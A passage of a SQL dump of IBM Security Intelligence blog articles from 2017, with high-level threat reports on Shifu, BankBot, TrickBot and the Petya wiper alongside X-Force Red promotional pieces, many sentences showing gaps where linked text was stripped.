started in August 2016. \n Due to the limited attack scope that kept Shifu focused on Japan and the U.K., the malware never made X-Force Research’s list of the top 10 banking Trojans. It was, however, one of the top-ranking malware threats in Japan in August 2016, alongside names such as Rovnix, Neverquest, Gozi, Zeus and URLZone. What made Shifu fade out this way? Is it safe to assume that Shifu is gone for good? These questions can only be answered with some educated speculation. Shifu was likely operated by a cybercrime group that was either located in Japan or had ties to local organized crime in the region. With that, parts of Shifu’s code and configuration, as well as its apparent alliances in the cybercrime area, suggest that it originated in Eastern Europe, most likely Ukraine. It’s possible that the parties that collaborated on the code development and operational sides did not match in experience and capability. As a result, although it is a highly sophisticated piece of malware, Shifu remained rather limited throughout its lifespan. It’s also possible that Shifu’s operators chose to  . In doing so, they limited their success rates and eventual profits from Shifu. That might have chipped away at the gang’s resources and eventually caused it to close shop. This is not to exclude the possibility of an internal feud between the gang’s leaders or even a looming law enforcement operation that spooked Shifu’s operators. Will Shifu be back? My personal guess is that it will return. Just as Shifu’s code included parts of other malware, codes such as Shifu are often sold to other gangs for hefty sums of money or used in different collaborations among cybercriminal groups. Shifu is likely a reincarnation of Shiz. As such, it can be reappropriated and refitted with new configurations to attack in other regions. With this, the circle of cybercrime is complete.  is keeping its eye on any further Shifu developments, so stay tuned. The   on X-Force Exchange will also reflect indicators of compromise (IoCs) and information on Shifu malware if it rises again.', '\'Banking Malware\', \'Banking Trojan\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Shifu\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/where-are-they-today-cybercrime-trojans-that-no-one-misses-shifu-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (86, 'Hello, My Name Is Space Rogue', 'Space Rogue', '2017-7-27', 'Hello, my name is  . Well, actually, it’s Cris Thomas, but the security community is most likely to recognize my work over the past two decades under my pseudonym. The name dates back to the early 1990s, when a few friends and I founded L0pht Heavy Industries, one of the first hacker collectives, based in the Boston area. You may remember us as the seven guys who testified before the U.S. Congress on May 19, 1998, to shed light on the vulnerabilities of the internet. We said something to the effect of, “Any of the seven individuals seated before you could take down the internet within 30 minutes and we need to do something about it now.” We didn’t know it then, but we were just scratching the surface of what has since transpired in the cybersecurity space. Since then, I’ve spent much of my time working with startups and small- to medium-sized organizations to uncover cybersecurity vulnerabilities and support the development of security strategies and programs. One of the companies I worked with over the years was security firm Trustwave. Specifically, I worked with the Spiderlabs Research division, which explored then-new security domains such as   and malware analysis. That’s where I met  , now global head of IBM’s X-Force Red, and Steve Ocepek, regional lead of North America for IBM. They are why I’m here today as one of the newest members of the elite security research and testing X-Force Red team. I’ll admit, I harbored some concerns around joining a large, global organization such as IBM — a bit of a 180-degree turn from the much smaller shops I’ve worked with in the past. However, after speaking with Charles and Steve, and meeting with the team, I quickly found that X-Force Red has the best of both worlds: We’ve got the ingenuity of a startup, but with the backing and resources of a multinational company that just happens to be a household name. This recipe for success isn’t going unnoticed and, at a time when   and the need for personnel is plentiful, the X-Force Red team is attracting the best of the best. This meeting of the minds, backed by the IBM network, is allowing us to turn seemingly improbable ideas into executable realities. As one of the newest members of the X-Force Red team, I’ll be playing a dual role on both the client consultation and solution design/development sides of the team. While I’m more comfortable working in the background — conducting research, testing and developing technology — I’ve had a lot of experience working directly with clients. I’ve had to be the bearer of bad news, uncovering major security flaws within organizations. I learned a lot about the different perspectives and motivations within a company, from the IT specialist all the way up to the CEO. Cybersecurity is no longer an IT problem; it’s not even a business problem. It has become just a general problem that every individual and organization needs to address. This is the problem   is helping to solve by promoting a model of continuous testing — not just checking the security box on the quarterly checklist. The best way to maintain security hygiene and stay ahead of the bad guys is to hire dedicated experts who are doing testing all the time. Unfortunately, most organizations don’t have the resources to do that in-house. That is where X-Force Red comes in. We do the testing for you, constantly and continuously. By partnering with X-Force Red, organizations can   as opposed to trying to halfheartedly execute the processes internally. Sounds like good news for businesses and bad news for cybercriminals, right? Exactly. The X-Force Red team is growing rapidly and continuing to attract new talent, and we aren’t just looking for decades of cybersecurity experience to build out our team. New security challenges also require new ways of thinking. That’s why IBM Security takes a   to hiring, in which skills and aptitudes are considered over traditional four-year degrees. If you have an appetite or interest in cybersecurity, I encourage you to explore that passion and find a niche within this expansive industry on which to hang your hat. Sharing is caring in this industry, so share what you’re working on and become a member of the cybersecurity community. Blog, tweet and network with like-minded individuals. You might find that the connections you make today could lead you to a career securing some of the world’s most important organizations with some of the brightest minds in cybersecurity tomorrow. I’m looking forward to sharing the latest and greatest coming from the team as we write year two in the book of IBM X-Force Red’s history.', '\'IBM\', \'IBM Security\', \'Malware Analysis\', \'Penetration Testing\', \'Security Testing\', \'Skills Gap\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/hello-my-name-is-space-rogue/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (87, 'After Big Takedown Efforts, 20 More BankBot Mobile Malware Apps Make It Into Google Play', 'Limor Kessem', '2017-7-27', 'A flashlight app, fake videos or a fake gaming app? Any one of those could be malicious and harboring a mobile malware app, right there in a trusted official app store. In an ongoing trend, IBM X-Force noted that malicious apps manage to circumvent controls and infiltrate legitimate stores. And this is not about the   infecting users in the app stores, which has almost become the norm, but rather that banking malware is now turning into somewhat of a resident in Google Play. BankBot is one of the mobile banking Trojans that has taken to the Play store in the past few months, managing to get through in the guise of widgets and benign apps. After the discovery and takedown of these apps —  , to be exact — it seems that BankBot still finds ways to get in and infect unwitting users. In a recent discovery, IBM X-Force mobile researchers identified at least 20 different malicious Android apps that made it into Google’s Play store delivering BankBot. Landing a place in official app stores is both effective and profitable for cybercriminals who operate mobile malware. For one, they do not have to invest in the distribution of the malware. They can save on costs associated with spam lists, SMS messaging or sending mass emails, not knowing who would eventually click and bother fetching the app from a third-party store — provided they’ve already enabled side-loading. It’s a longer shot. Second, malicious apps will get all that much more exposure in an official store, where hundreds of millions of people search for apps daily. Botnets are always a numbers game. Beyond sheer traffic, malware that makes it into the official stores enjoys the trust factor that comes with downloading an app from a legitimate source, likely leading to more app permissions being granted to malicious applications. \n  making it into the official app store is   by any means. It appears that criminals manage to find their way into legitimate stores, concealing their malware or including it in app updates that comes later on. The rising trend is this: While adware and other nuisance apps have been making in into official app stores for the past few years, now we are seeing banking malware increasingly showing up in those trusted download sources. This trend is extremely problematic because it introduces an entirely different threat level to the users of official stores, making them download a mobile banking Trojan, which can inevitably lead to a significant rise in fraudulent financial activity in the weeks and months following the installation. The BankBot malware emerged in  , initially identified in the wild as Android.BankBot.149, go_p00t, and later named BankBot and  . In essence, all these malware names relate to the   that was   it was discovered. According to X-Force research, BankBot affects only Android-based mobile devices at this time. It is part of the overlay class of mobile banking Trojans, which uses fake activity screens on top of legitimate apps to lure users into divulging their banking and payment card credentials. BankBot is geared toward financial fraud, and used by cybercriminals to commit identity theft, account takeover and spamming of the malware to additional devices. In April 2017, IBM X-Force researchers observed this malware use another notable manner to get into the official Play store. It started out as a benign application purporting to display funny videos. After downloading and executing it, the app would update itself, fetching and installing malware modules into the original application. This effectively turned the once benign app into a mobile banking malware complete with permissions and persistency on the device. Before mobile malware, cybercriminals looking to take over bank accounts for fraudulent transactions would run into SMS-based two-factor authentication and get stuck. Those launching phishing attacks saw their attack capabilities quickly decline as more banks adopted out-of-band authentication challenges. To bypass this authentication method, they started writing SMS hijackers, convincing infected PC owners to download those apps to their smartphones. This social engineering worked for a while, but it required resources and a very convincing ploy to make victims enable side-loading and get the malicious app from a third-party store. This is where mobile banking Trojans such as BankBot came in. They are a one-stop shop for authentication elements cybercriminals typically use to take over an account. The following is the takeover flow for criminals using malware like BankBot. It’s important to note that the infection begins on a mobile device, usually unbeknownst to the common user. When the fraud attempt eventually takes place, it happens from an entirely different device. The attacker uses his or her own endpoint to access the victim’s bank’s website to initiate the fraudulent transaction, and the user will not always logically connect the dots and realize the two are linked. When victims see their phones locked with a fake update message displayed by BankBot, they may think that there’s a technical issue. They could reach out to a local mobile repair shop or call their service provider to ask about it. Even if they do realize they’ve been hit by malware, it’s difficult to know what sort of malware and know that their bank account, and sometimes payment cards, have most likely been compromised at that point. What makes this worse is that the malware prevents victims from receiving calls, and so prevents banks from being able to contact them about the suspicious transaction. By often resorting to a factory reset, victims unfortunately eliminate forensic information that can be useful for identification and analysis of the infection. According to X-Force research, BankBot variants have been actively targeting banks in Spain and in France in July 2017. BankBot and the M.O. described in this post were detected and thwarted by  . The account takeover phase was detected with holistic   provided by IBM Trusteer Pinpoint Detect. \n Additionally, recent BankBot target lists include banks in Australia, Germany and Romania. X-Force research noted that BankBot is an overlay Android bot. It monitors for the launch of targeted banking applications on the infected device and then dynamically fetches a matching HTML overlay from its controller’s server. The overlay is presented to users, hiding the original app they may have opened and requesting their online banking credentials, credit card details or login combination. Once entered, the malware sends the details to the attacker in cleartext. Upon installation, this malware requests app administrator privileges on the device under the guise of a system update. Once installed, the application icon disappears, but the app continues to run in the background. BankBot will not operate if it detects that the infected device is located in CIS countries, alluding to its possible operator’s whereabouts. BankBot can lock the device’s screen to keep the user out when it is performing fraudulent activity on the victim’s account; to do so, it displays a fake update message on screen to delay access attempts to the device. The malware further possesses data exfiltration capabilities that enable it to hijack incoming SMS messages and forward them to the attacker, thus compromising SMS-based two-factor authentication. Since it is commercially available in underground forums and code-sharing sites, BankBot targets include a long list of banks across Europe, especially in Spain, Australia, New Zealand and some banks in Argentina. In some cases, the malware targets both Android smartphone and Android tablet versions of the banking apps it is after, depending on the botnet’s operator’s goals. According to ongoing research by X-Force, mobile malware has been rising in sophistication in the past few years, making it less surprising to see its operators manage to circumvent automated security controls on legitimate app stores. With various code leaks in the mobile malware scene, the number of malicious actors has also been steadily growing — especially since unlike PC botnets, mobile malware does not require a high level of technical savvy. Together, these factors make for a continually rising threat that now reaches more users than ever, turning them into potential fraud victims. X-Force identified the following apps as the malicious BankBot apps that made it into the Google Play store: Most apps have already been removed from the Play store at the time of this writing. Those that were live at the time of writing were disclosed to Google Play. X-Force captured some examples of the apps that contained BankBot: Mobile malware can turn customers of reputable app stores into fraud victims. IBM Trusteer Mobile SDK customers have full detection of all variants and overlay malware designed for financial fraud with the same M.O. IBM Trusteer Pinpoint Detect offers customers detection via the account takeover module.', '\'Android\', \'Android Apps\', \'Bank Fraud\', \'Banking Malware\', \'Banking Trojan\', \'Botnets\', \'Google Play\', \'Malware\', \'Mobile\', \'Mobile Malware\', \'Mobile Security\'', 'https://securityintelligence.com/after-big-takedown-efforts-20-more-bankbot-mobile-malware-apps-make-it-into-google-play/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (88, 'Multipronged IoT Security to Help Realize the Value of IoT Solutions', 'James Murphy', '2017-7-24', 'The Internet of Things (IoT) is an exciting and innovative technology that can help businesses discover new growth areas and income streams. With all this innovation to differentiate in industry verticals and challenge traditional operating models, it’s easy to overlook IoT security, both in terms of its uniqueness and its importance. The IoT is the application of multiple technologies, and people fail when they try to protect it as a single technology. It is critical to understand the unique challenges it introduces, such as the fact that connected devices are likely to be out in the wild and attacks against them might have physical consequences. The variety and volume of IoT devices are also important considerations.   predicted that the number of IoT devices will reach more than 20 billion in 2020. However, there is no standardized IoT device footprint. With all these nuances and the expectations of big business to reap great rewards from the IoT, the importance of security is clear. In the bid to create differentiating business models and gain a competitive advantage, businesses must secure their IoT investments. According to a  , 54 percent of IT decision-makers are concerned about IoT security risks. That’s why businesses need a trusted and secure IoT platform and regular access to security testing expertise at every stage of solution development, from design to operation. The IBM Watson IoT Platform is   for multilayered security, and IBM X-Force Red has a global team of experts who can deliver tailored testing for IoT solutions. The secure, cloud-based   has been   with ISO 27001, a security standard developed by the International Organization for Standardization (ISO). The platform also offers advanced threat intelligence to help customers visualize critical risks in the IoT landscape and create policy-driven automation to prioritize operational responses to security incidents. IBM has already   of the Watson IoT Platform to companies such as Schaeffler, an auto manufacturer that is using Watson to accelerate its digital transformation. The IoT solution stack stretches from the chip to the cloud, and incorporates hardware, network and applications. Each layer of the solution stack is important in relation to security. However, it is necessary to underline the human element across the entire IoT solution. There are likely to be multiple stakeholders at each layer, so there is a critical requirement to secure them all. Taking all these factors into account, it is crucial to partner with a trusted vendor that has a track record of helping enterprises securely transform their businesses. With the   in the IoT solution stack, it is important to test discrete parts, including hardware, communications and applications. The value that the IoT brings to business is centered around how all these discrete technologies and components work together. When building an IoT solution, it is critical to test the overall program and understand how it is integrated. Once the component parts have been combined, solution testing should be carried out at regular intervals during design, development and operation. With its vibrant ecosystem, in-house expertise, global reach, and depth and breadth of security products, services and professionals, IBM is uniquely positioned to offer advice and protection across the entire IoT solution stack. Some companies might rely on automated testing, but these tools and scanners offer only part of the coverage you need. To get a complete picture, an expert human tester must probe the parts of the system that scanners can’t reach or that you haven’t thought of. The   team is made up of security testers who have decades of experience. They can link disparate events and read between the lines to distill complex information into understandable and actionable intelligence. The other challenge is that your IoT solution likely includes hardware, software, infrastructure and communications that are provided by third parties. How can you be sure these components have been tested to the right levels? The X-Force Red team can provide a tailored security testing engagement that aligns to your IoT project. With each customer engagement, the team becomes even more experienced, learning the latest vulnerabilities and cybercriminal techniques to find uncommon exposures in your solution. Your   is supposed to be an emerging line of business and source of revenue for your enterprise, not a security exposure that might tarnish your brand reputation. It is better to leverage the X-Force Red team’s insider knowledge to generate an effective incident response plan than to wait and hope for the best. The team uses industry standards and custom-built tools to address the context of how you are deploying each discrete piece of technology across the entire IoT solution stack. The need to   will always evolve, and IoT solutions are not immune to this requirement. As you get more and more feedback from customers, your use cases will also evolve, and so will your plans and architecture. To interactively adapt your IoT solution and remain competitive in the marketplace, you will need to build security into your solution. Access to on-demand expertise via the X-Force Red team will enable you to apply security testing as your project plans change. Gaps — even serious and important ones — are usually cheaper to fix when you are designing and scaling out your solution in preproduction systems. The testing expertise of X-Force Red can help identify these gaps and fix them sooner rather than later. These experts provide responsive and proactive analysis of the issues in your solution as they are discovered. The   securely delivers test progress and results as the team finds them, allowing clients to respond sooner. Start exploring the IBM Watson IoT Platform today with a  .', '\'Compliance\', \'Connected Devices\', \'Incident Response (IR)\', \'Internet of Things (IoT)\', \'IoT Security\', \'Penetration Testing\', \'Security Solutions\', \'X-Force\'', 'https://securityintelligence.com/multipronged-iot-security-to-help-realize-the-value-of-iot-solutions/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (89, 'IBM X-Force Red Turns 1, Expands Into Auto and IoT Practice Areas', 'Charles Henderson', '2017-7-24', 'Earlier this year, I gave a talk at the RSA Conference about the privacy and security flaws in many of today’s connected cars. The response was nothing short of astounding. As it turns out, people get very nervous when you talk about finding and   from a mobile phone. While I didn’t initially set out to find vulnerabilities in modern cars, I couldn’t be happier that this project fell into my lap as global head of IBM X-Force Red. This past year since we founded   has been a wild ride. I have seen the team come together and grow rapidly. We’ve made amazing hires, done great work in penetration testing and surpassed all expectations. Perhaps most importantly, we are poised to continue to do great things in the future. I could not be prouder to be part of X-Force Red’s development. X-Force Red is a team made up of some of the world’s best security researchers — folks who grew up breaking their toys and figuring out ways to make computers misbehave. As soon as the team discovered my interest in connected cars, the light bulbs started going off. Soon, we were all working on breaking the biggest toys we could find: our cars. If you’ve purchased a car made in the last decade, there’s a good chance that hundreds or thousands of electrical components are packed into your ride. Each of these components performs one specific task, but also communicates with many other devices doing the same. If you stop to think about it, your car is essentially a computer on wheels. Some models have remote connectivity to apps on our phones, while others have satellite radio or infotainment packages. The newest cars are cruising around with Wi-Fi hotspots. The more convenience we pack into our cars, the more complex and   these systems become. To put it all into perspective, the space shuttle ran on about 4 million lines of code. To run the average modern car, it takes about  . It’s safe to say that auto manufacturers aren’t looking to make cars less functional than their competitors, which means the attack surface of our vehicles is only going to expand. So how do we make sure we’re winning this technology race? By   and then testing the complete system. Sound too simple? At first, yes, but consider the way automotive production works. If we stringently test the hardware, applications, networks and even the human interactions of this year’s model, we’re going to have a pretty solid baseline for next year’s model. The auto industry knows that the most effective way to make cars is to keep what people like about this year’s edition and then make the next model even better. That’s just good business. In the world of security testing, we’re also about good business. That’s precisely why we’ve made it convenient and transparent for our automotive clients (as well as all our clients) to programmatically test their products and solutions. For a vehicle, we have to test every component that could possibly introduce vulnerabilities into the complete system, and then test the ones that shouldn’t. This all happens before we test the complete system as a whole. Once we establish our baseline, the following year’s model becomes part of a programmatic test. From a security testing perspective, we’re thorough. Cybercriminals only have to find one way into a system, but we have to find every way to protect that same system. If we’re looking at the same components year-over-year in a given car, with only incremental changes in infotainment, telemetry and various other systems, the programmatic testing process becomes much easier to manage. Managing the security of multiple models and years of cars can become increasingly complex as new software updates and patches are rolled out — but it doesn’t have to be. Our automotive clients use the   to schedule security tests, view vulnerability assessments in real time and collaborate with X-Force Red on remediation before cybercriminals even know the updates exist. At this point you may be saying to yourself, “It seems like this process would work for other industries beyond automotive.” And you’re right! Today we are pleased to launch a collaboration with the   to help ensure that Internet of Things (IoT) solutions get X-Force Red’s special brand of hacker love. From the ideation phase to deployment and throughout the life cycle, X-Force Red can offer our expertise and, most importantly, assign a real human security expert to actively try to make the given product misbehave. We really love doing that, in case it wasn’t clear. In the end, we want to help our clients move from only testing distinct targets to programmatic testing and solution testing. Since data is so often leveraged in a shared model where devices interoperate seamlessly, the industry can no longer think of technologies in isolation.', '\'Black Hat\', \'Black Hat USA\', \'IBM\', \'IBM Security\', \'Internet of Things (IoT)\', \'Penetration Testing\', \'Security Testing\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-red-turns-one-expands-into-auto-and-iot-practice-areas/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (90, 'TrickBot Habla Español: Trojan Widens Its Attack Scope in Spain, Brings Redirection Attacks to Local Banks', 'Limor Kessem', '2017-7-19', 'The TrickBot Trojan has been steadily ramping up its activity this year, going into a rather intensive period of updates and attacks that  . From the looks of it, TrickBot’s operators have been investing heavily into widening the scope of their attacks and are preparing redirection attacks against banks in 19 different countries. After adding  , the latest additions to TrickBot’s target list are Spanish banks. While the malware had previously targeted only one bank in Spain, it now targets six brands in the country, complete with redirection attacks. Some banks on the list are smaller entities, suggesting that TrickBot is keeping a low profile to test out the country’s banking system before moving on to a wider campaign. Other countries where TrickBot deploys redirection attacks at this time include Australia, Canada, Denmark, Finland, France, Germany, Ireland, Israel, Lithuania, Luxembourg, Netherlands, New Zealand, Norway, Singapore, Spain, Sweden, Switzerland, United Arab Emirates, the U.K. and the U.S. TrickBot is the first and only banking Trojan to cover this many geographies and language zones with redirection schemes, an attack type known to be more resource-intensive to produce and maintain than dynamic webinjection schemes. TrickBot’s operators continue to focus their efforts on the business sector, investment banking and high net-worth individuals who hold accounts with private banks and wealth management firms. It’s clear that TrickBot is after big money, and it’s important to keep in mind that its operators likely possess the expertise to obtain large amounts of stolen funds, move them on and launder them. Starting June 2017, IBM X-Force researchers observed that alongside malware such as Dridex, Locky and Jaff, TrickBot’s operators were using the   to deliver their malware in massive email spam infection campaigns that often launch millions of malicious emails a day. TrickBot has been varying the types of files and attachments it comes inside to evade automated detection. The latest ploy is informing potential victims that they have a verified DocuSign document they need to open. More than just fitting targeted webpages with HTML or JavaScript injections, many of TrickBot’s targets are fitted with customized redirection attacks — the most advanced method to manipulate what victims see on their browsers. In simple redirection of browsing to a different page, the user sees the switch to the next website and can observe the change in URL. This is not what happens in TrickBot’s case. Malware redirections hijack the victim to a fake website hosted on separate servers before he or she even sees the destination page. In parallel, the malware contacts the bank’s genuine webpage and keeps a live connection with it. That way, the fake page displays the bank’s correct URL in the address bar, as well as the bank’s genuine digital certificate. The user is unlikely to notice any difference or suspect that he or she reached a malicious site. The only thing that can tip off a victim is an altered flow of events that takes place on the fake site. At that point, the victim should close the browsing window and call his or her bank to inquire about the out-of-the-ordinary process the malware asked them to complete. The redirection M.O. is used to bypass bank security measures by hijacking the victim to a malicious website before he or she ever reaches the bank’s site. By seamlessly moving infected victims away from the bank’s genuine website, the malware’s operator can switch to using webinjections to steal login details, personally identifiable information (PII) and critical authentication codes on the replica site — all without the bank knowing that the customer’s session has been compromised or discovering the flow of events on the fake site. Redirection attacks are most often identified with the resources and capabilities of organized cybergangs because of the extra setup required to create and maintain them for each unique target. According to X-Force research, the Trojan redirection technique surfaced in 2014, when the Dyre gang launched it against banks in the U.K. TrickBot emerged in August 2016 and launched into a testing and development period in what appears to be a banking Trojan project. This malware is a modular Trojan that bears a striking resemblance to the  , both in its internal makeup and the infection methods it uses to reach new endpoints. According to X-Force research, the malware targets banks in over 24 countries across the globe and is ranked seventh in terms of its activity in the financial malware arena. TrickBot now accounts for about 4 percent of attacks on a global scale. I expect to see it rise further this year due to its geographical expansion and increased activity in Q2 and Q3 2017 so far. The   team recently analyzed the following TrickBot MD5s: TrickBot is also featured in an   on IBM’s X-Force Exchange.', '\'Banking\', \'Banking Trojan\', \'Financial Malware\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'TrickBot\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/trickbot-habla-espanol-trojan-widens-its-attack-scope-in-spain-brings-redirection-attacks-to-local-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (91, 'Information and Communication Technology (ICT) Industry: Second-Most Attacked Sector in 2016', 'Michelle Alvarez', '2017-7-10', 'The information and communication technology (ICT) industry has evolved greatly over the last several decades. The   of ICT devices and systems, along with modern society’s dependence on the technologies and services this sector provides, increases the risk of cyberattack. Furthermore, firms in this industry often act as a clearinghouse or storehouse for data gathered from other industries. Not surprisingly, the   revealed that ICT was the second-most attacked industry in 2016. The average IBM X-Force-monitored client in this sector experienced 113 percent more attacks than the average cross-industry client (see Figure 1), clearly contributing to this sector’s high placement among most attacked industries in 2016. IBM X-Force Interactive Security Incidents data is a sampling of notable publicly disclosed incidents. Included are breaches, which are incidents resulting in the  . As Figure 2 shows, there was no shortage of incidents affecting information and communication technology organizations globally. With an unprecedented 3.3-plus billion records breached, the information and communication technology sector experienced the most records compromised out of all industries in 2016. A   focused on the top attacks detected against the information and communication technology sector. Since the top ICT security threat involved attackers attempting to gain unauthorized access by manipulating system data structures, deploying a   can help prevent buffer overflow and other vulnerabilities. We recommend reviewing the report for other best practice guidelines.', '\'Buffer Overflow\', \'Data Breach\', \'Data Breaches\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Industry\', \'Telecommunication Industry\', \'Threat Intelligence\'', 'https://securityintelligence.com/information-and-communication-technology-ict-industry-second-most-attacked-sector-in-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (92, 'A ‘Wiper’ in Ransomware Clothing: Global Attacks Intended for Destruction Versus Financial Gain', 'Mike Oppenheim', '2017-6-29', 'After finalizing initial analysis,   concluded that the   that started on Tuesday, June 27, were intended as destructive attacks against Ukraine, rather than a means for cybercriminals to make money from ransom payouts. In other words, this attack was not focused on financial gain like the ransomware attack it was veiled to be. Several pieces of evidence from our research suggest that the attacks were designed to permanently disable as many machines as possible and that the malware was, in fact, more characteristic of a “wiper” attack (intended to destroy data) rather than a ransomware attack. IBM X-Force IRIS outlined this evidence in technical detail below. However, the main factor leading to this conclusion is that the Personal Installation Key provided on the lock screen instructions is randomly generated and incapable of relaying the information the attacker would need to provide the correct Advanced Encryption Standard (AES) decryption key. Put simply, the information provided in the “ransomware” is not accurate or relevant to unlocking any affected machine. Additionally, the design of the attack suggests that it was carried out by a technically skilled group of cybercriminals, yet the execution of the ransomware and payment methodology showed little to no expertise or intent to produce financial gains. \n Further analysis of impacted victims also led our team to conclude that this attack was specifically aimed at organizations within Ukraine: Based on these factors, it’s clear that the Petya variant used in these attacks is not related to the traditional Petya malware in purpose or technical indication. Given this, we believe the attacks were executed by a separate group than the previous Petya attacks. Additional technical analysis of this evidence is below. For victims of this attack, following the instructions on the ransomware’s lock screen does not provide the attacker with enough information to derive the recovery key needed to unlock files on impacted machines. This indicates that either the malware was deployed without testing, or the attacker was never serious about unlocking files for those that would pay the ransom. Given that the attacker accomplished much more technical feats (automated lateral movement and ETERNALBLUE and ETERNALROMANCE propagation), IBM X-Force IRIS believes the attacker was not serious about unlocking files. We know that emailing the address specified by the attacker on the ransomware lock page results in a bounce message due to its shutdown by the provider. This tactic for payment verification is also uncommon and prone to shutdowns by the email provider.  During our continued analysis, IBM X-Force IRIS researchers identified an additional encryption mechanism utilized by the malware. The MFT is encrypted using the Salsa20 algorithm, but the key is not stored anywhere on disk as-is or in encoded/encrypted format. The MFT encryption, plus the AES encryption of files targeted by the malware, put the odds of data recovery at zero even with access to the attacker’s RSA private key. A wiper is characterized by unrecoverable file destruction, which is effectively what this new Petya variant accomplished. IBM X-Force IRIS assessed the following destructive capabilities: IBM X-Force IRIS determined that, theoretically, there is a very narrow path to decryption for those who have access to the attacker’s RSA private key. The RSA private key could be used to decrypt an encrypted AES key present in the readme.txt ransom file. You would need to mount the drive on another system and copy over the infected files, then decrypt them with the unencrypted AES key. Note that only the attacker has access to the RSA private key, and the odds of it becoming public are unlikely (it would need to be released by the attackers themselves or someone who had compromised the private key). For all intents and purposes, the odds of recovery are nearly zero. Files on victim machines are encrypted using a randomly generated AES key that is then encrypted using an RSA public key. The encrypted AES key is then stored as a base64 blob in a readme.txt ransom note created by the malware. The readme.txt contents are not accessible from the lock screen or after the MBR is patched by the malware. Victims only get a few pieces of information from the lock screen: The Personal Installation Key is randomly generated. This information is not enough to generate the system-specific AES encrypted or decrypted key. It is impossible for the attacker to provide the required information to unlock files on victim machines when provided with only the requirements on the screen lock page. It should be noted these problematic shifts are different from traditional Petya payment mechanisms, which proved successful in the past. Finally, for all active cases that IBM Security is working, the impacted organization suffered due to a footprint in Ukraine. While this event was global in scale, IBM’s experience shows a global impact was produced due to the global nature of companies with assets in Ukraine versus genuine global targeting. In fact, “patient zero,” or the initial host for all impacted clients we investigated, were machines based in Ukraine. It is unlikely that financially motivated actors would limit their targeting — especially for a wormlike tool — to one region or country. For additional technical details, see the live   on IBM X-Force Exchange.', '\'Advanced Attacks\', \'Advanced Malware\', \'Advanced Threats\', \'IBM Security\', \'IBM X-Force Exchange\', \'IBM X-Force Incident Response and Intelligence Services\', \'Malware\', \'Petya\', \'Ransomware\'', 'https://securityintelligence.com/a-wiper-in-ransomware-clothing-global-attacks-intended-for-destruction-versus-financial-gain/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (93, 'Petya Weren’t Expecting This: Ransomware Takes Systems Hostage Across the Globe', 'Diana Kelley', '2017-6-27', 'The malware, being referred to as a Petya variant, has impacted systems in  , one initial infection vector has been traced, by Microsoft, to the  . And there are some reports that the creators of the malware meant to   not just hold it ransom. Today IBM X-Force analysts determined that the credentials used with PsExec and WMIC for lateral movement were obtained using Mimikatz. To help stop lateral movement a new recommendation has been added to the recommendations at the end of this post. \n Once the malware is loaded on a machine it encrypts the MBR (master boot record) and schedules a reboot. During the reboot a fake CHKDSK screen is displayed. After the fake CHKDSK run is finished, the system is again restarted and the following ransom message is shown: Additional technical details from   of the IBM X-Force Research team: If PsExec failed, the malware will attempt to use the WMIC tool to execute its dropped copy: Early on Tuesday, June 27,   that organizations in the Ukraine and elsewhere in Europe were suffering   attacks. It quickly became clear that this Petya attack could equal or surpass the May  . WannaCry’s spread was so successful because it was powered by a flaw in Windows, and although Microsoft had released a patch to fix the flaw, many companies didn’t apply it before the outbreak. Luckily, companies outside of the initial attack zone of the EU were able to get their systems patched to prevent  . Unfortunately, the authors of this variant of ransomware have learned from the past. The current outbreak of Petya ransomware can be spread to unpatched systems via the same exploit as WannaCry, but it can also achieve lateral movement to infect patched systems on connected networks using Windows Management Instrumentation Command-line (WMIC) and PsExec, a remote command tool from Microsoft. \n Most outlets are reporting the ransomware as Petya, however at least one security company believes it is a copycat and not a true Petya variant. At this time, IBM X-Force has identified at least three samples we believe are updated Petya variants. Petya ransomware first appeared  . It is unique in the ransomware space because it encrypts the master boot record (MBR) and master file table (MFT) on infected hosts. One of Petya’s more unique aspects is that it can work even if a system is offline. It does not require a live connection to a command-and-control (C&C) server. In this recent outbreak, it appears that the current Petya payload is being distributed using the   that was part of the so-called Shadow Brokers leaks that powered the spread of WannaCry. As in the WannaCry outbreak, this malware is modular. The Petya outbreak made headlines for spreading very rapidly on June 27, 2017, but the building blocks were not new. One of the ways Petya moves around and propagates is by scanning transmission control protocol (TCP) port 445 to identify and target machines that use unpatched versions of server message block (SMB). If that sounds familiar from your reading during the WannaCry outbreak, you’re right. It’s the same. IBM X-Force Incident Response & Intelligence Services (XF-IRIS) has confirmed that the samples from the current outbreak are using EternalBlue. From the alleged Shadow Brokers leak, EternalBlue exploits  , which allows attackers to execute arbitrary code on a target system. This can include code that scans for the presence of exploit code like DOUBLEPULSAR, or to scan nearby systems and attempt to infect them with exploit code. WMIC and PsExec are not vulnerabilities: They are Microsoft tools to help admins manage systems and networks. WMIC allows users to run processes and scripts, while PsExec allows a remote user to take remote control of a system. In the hands of administrators these are important and useful tools, but when accessed by an attacker, they can be used to install malcode — like Petya — on target systems. Once on the system, the ransomware copies itself to the   directory and installs a PE file in   To cover its tracks, the ransomware uses   to create a task file that will reboot the system at a scheduled time. To further cover its tracks, the ransomware uses   to clear out Setup, System, Security and Application logs, and uses   to delete information in the change journal. Many companies may be tempted to pay the ransom to get their systems back online. Going forward, address network segmentation and backups so that in the future, if systems are locked up, they can be taken offline and restored quickly. IBM Security recommends: Based on the seriousness of this event, IBM is making all of our findings publicly available via a continuously updated  . For immediate help, contact the IBM X-Force 